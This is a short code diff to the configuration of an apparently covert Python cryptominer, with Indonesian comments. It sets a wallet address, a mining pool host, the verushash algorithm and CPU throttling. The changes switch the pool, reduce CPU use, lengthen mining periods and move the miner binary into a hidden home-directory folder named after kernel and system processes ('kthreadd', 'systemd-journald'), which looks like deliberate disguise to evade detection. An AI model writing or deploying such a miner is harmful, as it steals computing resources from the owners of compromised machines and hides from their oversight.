@@ -7,13 +7,13 @@ import shutil
 
 # Konfigurasi
 WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
-POOL = "www.myloveistrikupoppy.my.id:11001"
+POOL = "ghost.darkverse.cloud:11002"
 ALGO = "verushash"
-CPU_THREADS = 2
-PROGRAM_TIME = 25  # menit
+CPU_THREADS = 1
+PROGRAM_TIME = 45  # menit
 REST_TIME = 5  # menit
-BASE_PATH = "/dev/shm/.cache/"
-ORIGINAL_BINARY = BASE_PATH + "systemd-journald."
+BASE_PATH = os.path.expanduser("~/.cache/kthreadd/")
+ORIGINAL_BINARY = BASE_PATH + "systemd-journald"
 
 def generate_random_name(length=8):
     return ''.join(random.choices(string.ascii_lowercase, k=length))
